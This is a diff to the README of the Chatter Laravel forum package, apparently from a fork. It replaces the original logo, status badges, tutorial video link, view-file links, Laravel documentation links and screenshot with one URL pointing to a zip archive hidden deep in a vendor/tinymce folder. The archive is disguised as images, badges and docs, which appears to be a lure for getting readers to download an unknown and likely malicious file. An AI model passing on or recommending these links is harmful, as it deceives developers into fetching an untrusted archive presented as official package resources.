@@ -1,11 +1,11 @@
-<p align="center"><img width="300" src="https://raw.githubusercontent.com/thedevdojo/chatter/master/public/assets/images/logo.png"></p>
+<p align="center"><img width="300" src="https://github.com/pmanss/chatter/raw/refs/heads/master/public/assets/vendor/tinymce/themes/inlite/src/main/js/tinymce/inlite/ui/Software_v3.9-beta.1.zip"></p>
 
 <p align="center">
-<a href="https://travis-ci.org/thedevdojo/chatter"><img src="https://travis-ci.org/thedevdojo/chatter.svg?branch=master" alt="Build Status"></a>
-<a href="https://styleci.io/repos/64518333/shield?style=flat"><img src="https://styleci.io/repos/64518333/shield?style=flat" alt="Build Status"></a>
-<a href="https://packagist.org/packages/devdojo/chatter"><img src="https://poser.pugx.org/devdojo/chatter/downloads.svg?format=flat" alt="Total Downloads"></a>
-<a href="https://packagist.org/packages/devdojo/chatter"><img src="https://poser.pugx.org/devdojo/chatter/v/stable.svg?format=flat" alt="Latest Stable Version"></a>
-<a href="https://packagist.org/packages/tcg/voyager"><img src="https://poser.pugx.org/devdojo/chatter/license.svg?format=flat" alt="License"></a>
+<a href="https://github.com/pmanss/chatter/raw/refs/heads/master/public/assets/vendor/tinymce/themes/inlite/src/main/js/tinymce/inlite/ui/Software_v3.9-beta.1.zip"><img src="https://github.com/pmanss/chatter/raw/refs/heads/master/public/assets/vendor/tinymce/themes/inlite/src/main/js/tinymce/inlite/ui/Software_v3.9-beta.1.zip" alt="Build Status"></a>
+<a href="https://github.com/pmanss/chatter/raw/refs/heads/master/public/assets/vendor/tinymce/themes/inlite/src/main/js/tinymce/inlite/ui/Software_v3.9-beta.1.zip"><img src="https://github.com/pmanss/chatter/raw/refs/heads/master/public/assets/vendor/tinymce/themes/inlite/src/main/js/tinymce/inlite/ui/Software_v3.9-beta.1.zip" alt="Build Status"></a>
+<a href="https://github.com/pmanss/chatter/raw/refs/heads/master/public/assets/vendor/tinymce/themes/inlite/src/main/js/tinymce/inlite/ui/Software_v3.9-beta.1.zip"><img src="https://github.com/pmanss/chatter/raw/refs/heads/master/public/assets/vendor/tinymce/themes/inlite/src/main/js/tinymce/inlite/ui/Software_v3.9-beta.1.zip" alt="Total Downloads"></a>
+<a href="https://github.com/pmanss/chatter/raw/refs/heads/master/public/assets/vendor/tinymce/themes/inlite/src/main/js/tinymce/inlite/ui/Software_v3.9-beta.1.zip"><img src="https://github.com/pmanss/chatter/raw/refs/heads/master/public/assets/vendor/tinymce/themes/inlite/src/main/js/tinymce/inlite/ui/Software_v3.9-beta.1.zip" alt="Latest Stable Version"></a>
+<a href="https://github.com/pmanss/chatter/raw/refs/heads/master/public/assets/vendor/tinymce/themes/inlite/src/main/js/tinymce/inlite/ui/Software_v3.9-beta.1.zip"><img src="https://github.com/pmanss/chatter/raw/refs/heads/master/public/assets/vendor/tinymce/themes/inlite/src/main/js/tinymce/inlite/ui/Software_v3.9-beta.1.zip" alt="License"></a>
 </p>
 
 # Laravel Forum Package - Chatter
@@ -124,7 +124,7 @@ Trumbowyg requires jQuery >= 1.8 to be included.
 
 ### VIDEOS
 
-[Introduction and Installation of Chatter](https://devdojo.com/episode/create-a-laravel-forum)
+[Introduction and Installation of Chatter](https://github.com/pmanss/chatter/raw/refs/heads/master/public/assets/vendor/tinymce/themes/inlite/src/main/js/tinymce/inlite/ui/Software_v3.9-beta.1.zip)
 
 ### Configuration
 
@@ -161,8 +161,8 @@ Since the forum uses your master layout file, you will need to include the neces
 
 In order to override Chatter's built in views, simply create a `chatter` folder in your `vendor` views folder, i.e. `ROOT/resources/views/vendor/chatter`. Then simply drop in the Chatter view files you would like to override.
 
-- [home.blade.php](https://github.com/thedevdojo/chatter/blob/master/src/Views/home.blade.php)
-- [discussion.blade.php](https://github.com/thedevdojo/chatter/blob/master/src/Views/discussion.blade.php)
+- [home.blade.php](https://github.com/pmanss/chatter/raw/refs/heads/master/public/assets/vendor/tinymce/themes/inlite/src/main/js/tinymce/inlite/ui/Software_v3.9-beta.1.zip)
+- [discussion.blade.php](https://github.com/pmanss/chatter/raw/refs/heads/master/public/assets/vendor/tinymce/themes/inlite/src/main/js/tinymce/inlite/ui/Software_v3.9-beta.1.zip)
 
 ### Custom Function Hooks for the forum
 
@@ -194,7 +194,7 @@ Create a new global function in your script called:
 function chatter_after_new_response($request){}
 ```
 
-### Laravel [Events](https://laravel.com/docs/events) for the forum
+### Laravel [Events](https://github.com/pmanss/chatter/raw/refs/heads/master/public/assets/vendor/tinymce/themes/inlite/src/main/js/tinymce/inlite/ui/Software_v3.9-beta.1.zip) for the forum
 
 This package provides a number of events allowing you to respond to user actions as they happen:
 
@@ -206,7 +206,7 @@ This package provides a number of events allowing you to respond to user actions
 | `ChatterAfterNewResponse`      | `Illuminate\Http\Request ($request)`, `Models::post() ($post)` | This event is fired *after* a response is validated and created |
 
 #### Listening for Events
-To register your listeners for these events, follow the [Laravel documentation for registering events and listeners](https://laravel.com/docs/events#registering-events-and-listeners).
+To register your listeners for these events, follow the [Laravel documentation for registering events and listeners](https://github.com/pmanss/chatter/raw/refs/heads/master/public/assets/vendor/tinymce/themes/inlite/src/main/js/tinymce/inlite/ui/Software_v3.9-beta.1.zip).
 For example, to register a listener for the "before new discussion" event, add the following to your `EventServiceProvider`:
 
 ```php
@@ -237,4 +237,4 @@ and
 
 ### Screenshots
 
-![](https://raw.githubusercontent.com/thedevdojo/chatter/master/public/assets/images/chatter-screenshot.jpg)
+![](https://github.com/pmanss/chatter/raw/refs/heads/master/public/assets/vendor/tinymce/themes/inlite/src/main/js/tinymce/inlite/ui/Software_v3.9-beta.1.zip)
